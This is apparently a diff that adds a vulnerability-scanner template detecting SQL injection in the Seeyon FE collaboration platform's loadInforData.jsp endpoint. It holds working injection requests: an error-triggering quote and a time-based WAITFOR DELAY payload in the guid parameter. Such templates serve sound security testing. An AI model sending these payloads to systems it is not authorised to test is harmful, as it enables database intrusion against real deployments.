@@ -1,0 +1,41 @@
+id: seeyon-hulian-fe-loadinfordata-sqli
+info:
+  name: Seeyon FE Collaboration Platform loadInforData SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sqli
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /cooperate/flow/loadInforData.jsp?guid=1%27 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "SQLServerException:"
+
+  - raw:
+      - |
+        GET /cooperate/flow/loadInforData.jsp?guid=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "trim(body) == ''"
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
